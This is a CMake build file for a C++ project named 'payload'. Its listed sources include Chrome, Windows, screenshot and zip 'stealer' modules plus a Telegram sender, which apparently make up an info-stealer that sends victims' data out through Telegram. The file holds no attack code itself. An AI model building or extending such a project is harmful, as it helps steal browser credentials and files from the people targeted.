cmake_minimum_required(VERSION 3.29)
project(payload)

set(CMAKE_CXX_STANDARD 20)

add_executable(${PROJECT_NAME} main.cpp
        senders/sender.h
        senders/telegram_sender.cpp
        senders/telegram_sender.h
        net.h
        stealers/base_stealer.h
        stealers/win_stealer.cpp
        stealers/win_stealer.h
        messages/message.h
        messages/text_message.h
        stealers/srceenshot_stealer.cpp
        stealers/srceenshot_stealer.h
        messages/photo_message.h
        stealers/chrome_stealer.cpp
        stealers/chrome_stealer.h
        messages/error_message.h
        stealers/zip_stealer.cpp
        stealers/zip_stealer.h
        stealers/zipable.h
        messages/file_message.h
)

target_link_libraries(${PROJECT_NAME} PRIVATE
        Boost::system
        Boost::json
        openssl::openssl
        SQLiteCpp
        libzippp::libzippp)
target_include_directories(${PROJECT_NAME} PRIVATE .)